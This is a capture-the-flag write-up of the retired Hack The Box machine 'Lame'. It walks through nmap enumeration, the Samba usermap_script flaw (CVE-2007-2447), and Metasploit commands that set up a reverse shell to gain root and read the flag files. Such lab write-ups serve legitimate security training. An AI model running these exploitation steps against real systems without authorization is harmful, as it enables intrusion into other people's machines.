Hack The Box - Lame 🦹 (Retired Machine) - Root & User Flag Writeup
This document details my penetration testing methodology applied to the retired Hack The Box machine "Lame." Classified as an Easy-rated Linux box, Lame serves as an excellent introduction to basic enumeration, identifying common vulnerabilities, and leveraging widely-used exploitation frameworks like Metasploit. The primary vulnerability exploited was an outdated Samba service, leading to immediate root access.

Machine: Lame
OS: Linux
Difficulty: Easy
IP: 10.10.10.3 (Note: Always use your specific target IP address, e.g., 10.10.11.74 from your screenshots, for your actual attempts.)

Methodology Overview
The approach followed a standard penetration testing methodology:

Enumeration: Identifying open ports and services, and their versions.

Vulnerability Identification: Researching known flaws in identified services.

Exploitation: Leveraging the identified vulnerability to gain an initial foothold.

Post-Exploitation: Confirming access level and retrieving flags.

Phase 1: Enumeration - Mapping the Target
The initial phase involved identifying active services on the target machine.

Initial Nmap Scan
I began with a comprehensive Nmap scan to identify open ports and services, including version detection and default script execution. For this "Easy" difficulty machine, a standard service version detection scan proved most effective, as aggressive or stealthier flags were unnecessary and could even misrepresent simple firewall behaviors.

nmap -sC -sV -oA nmap/lame 10.10.10.3

-sC: Executes default Nmap scripts, providing additional enumeration and identifying common misconfigurations.

-sV: Performs service version detection, which is critical for identifying specific software versions that might be exploitable.

-oA nmap/lame: Outputs the scan results in all available formats (normal, XML, and greppable) into files prefixed with nmap/lame for organized documentation.

10.10.10.3: The target machine's IP address. (Remember to substitute with your specific target IP.)

Key Findings from Nmap:
The Nmap scan yielded the following crucial information about the services running on Lame:

# Nmap 7.9X scan report for 10.10.10.3
# Host is up (0.X latency).
# Not shown: 996 closed ports
# PORT    STATE SERVICE     VERSION
# 21/tcp  open  ftp         vsftpd 2.3.4
# 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (Workgroup: WORKGROUP)
# 445/tcp open  microsoft-ds Samba smbd 3.X - 4.X (Workgroup: WORKGROUP)
# Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

FTP (21/tcp): Running vsftpd 2.3.4. This version is known to be vulnerable to a backdoor command execution (CVE-2011-2523). While a significant vulnerability, it's typically not the intended path for Lame. My attempt at anonymous login was denied.

SSH (22/tcp): Running OpenSSH 4.7p1 Debian 8ubuntu1. An older version, but not immediately exploitable without credentials.

NetBIOS/SMB (139/tcp, 445/tcp): Running Samba smbd 3.X - 4.X. This immediately raised a red flag. Older Samba versions are frequently vulnerable, making this the most promising lead.

Phase 2: Vulnerability Identification - Pinpointing the Exploit
Given the broad 3.X - 4.X version range reported by Nmap for Samba, I focused my research on well-known, simple vulnerabilities affecting older Samba versions, especially those common on "Easy" Hack The Box machines.

The key vulnerability identified was:

CVE-2007-2447: Samba usermap_script Remote Code Execution

Affected Versions: This vulnerability affects Samba versions from 3.0.20 through 3.0.25rc3.

Mechanism: It allows unauthenticated remote attackers to execute arbitrary commands by injecting shell metacharacters into the username field during an authentication attempt. This occurs if the username map script option is enabled in smb.conf on the server.

(Self-Correction Note: While Nmap reported a broad range, common "Easy" boxes often target specific versions within that range. A more precise nmap -sV on just the SMB ports, or using smbclient -V, could often pinpoint the exact 3.0.20 version, confirming this specific exploit's applicability.)

Phase 3: Exploitation - Gaining Root Access with Metasploit
Given the well-known nature of CVE-2007-2447 and its presence on an Easy-rated machine, the Metasploit Framework was the ideal tool for exploitation.

Leveraging Metasploit Framework:
Start Metasploit Console:

msfconsole

Search for the Exploit:

search CVE-2007-2447
# or
search usermap_script

The relevant module identified was exploit/multi/samba/usermap_script.

Select and Configure the Exploit Module:

use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3  # Set the target machine's IP
set LHOST 10.10.14.X   # Set your Kali/attacking machine's VPN IP (e.g., your tun0 interface IP)
set LPORT 4444         # The default listener port for the reverse shell, usually fine

Execute the Exploit:

run
# or
exploit

Gaining a Shell:
Upon successful execution, Metasploit returned a Meterpreter session, which immediately provided direct root access to the Lame machine. This confirmed that the vulnerability was successfully exploited and escalated privileges were obtained directly.

(Note: In some scenarios, a basic shell might be dropped first. If a Meterpreter session isn't immediately available, you can background the session (Ctrl+Z), list sessions (sessions), and then use sessions -u <session_id> to upgrade it to Meterpreter if desired for more capabilities.)

Phase 4: Post-Exploitation - Flag Collection
With confirmed root access, collecting both the user and root flags was straightforward.

Confirm User:
I verified my privileges within the compromised system:

whoami
# Output: root

This confirmed that I had indeed gained root privileges.

Locate and Retrieve Root Flag:
The root flag is conventionally located in the /root/ directory on Linux systems.

cd /root/
ls -la
cat root.txt

(Insert the actual root flag value here.)

Locate and Retrieve User Flag:
First, I listed the home directories to identify standard user accounts on the system:

ls -la /home/
# Output: Found user 'makis' (example, replace with actual username if different)

Then, I navigated to the user's home directory and read the user flag:

cd /home/makis/
ls -la
cat user.txt

(Insert the actual user flag value here.)

Conclusion
Lame stands as an excellent introductory machine that vividly highlights the critical importance of proper service versioning and consistent security patching. The Samba usermap_script vulnerability (CVE-2007-2447) serves as a textbook example of how a misconfiguration (enabled usermap_script) combined with an outdated service can lead to trivial, unauthenticated root access. This box reinforces fundamental enumeration skills and underscores the immense power and utility of exploitation frameworks like Metasploit in a penetration testing context. My successful exploitation of Lame further solidifies the foundational knowledge essential for the eJPT v2 certification.

proof of pwn - https://www.hackthebox.com/achievement/machine/2424577/1
